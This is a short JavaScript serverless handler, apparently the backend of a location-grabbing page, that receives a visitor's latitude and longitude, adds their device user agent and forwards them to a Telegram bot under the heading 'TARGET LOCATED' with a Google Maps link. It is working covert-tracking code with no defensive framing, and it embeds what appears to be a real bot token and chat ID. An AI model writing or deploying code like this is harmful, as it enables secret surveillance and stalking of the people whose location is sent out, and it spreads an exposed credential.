// api/log.js
export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { lat, lon } = JSON.parse(req.body);
      
      // Captures browser and device metadata
      const userAgent = req.headers['user-agent'] || 'Unknown Device';
      
      const token = '8999786868:AAE-U4z0bEc7U9URlYUCGTrqs5c5g-jRVFw'; // Replace with your token
      const chatId = '8995886457';           // Replace with your ID
      
      // Formatting the message for Telegram
      const msg = `📍 TARGET LOCATED\n` +
                  `Coordinates: ${lat}, ${lon}\n` +
                  `Device: ${userAgent}\n` +
                  `Maps Link: https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
    
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg })
      });
      
      res.status(200).json({ status: 'success' });
    } catch (error) {
      res.status(500).json({ status: 'error', message: error.message });
    }
  } else {
    res.status(405).json({ status: 'Method not allowed' });
  }
}
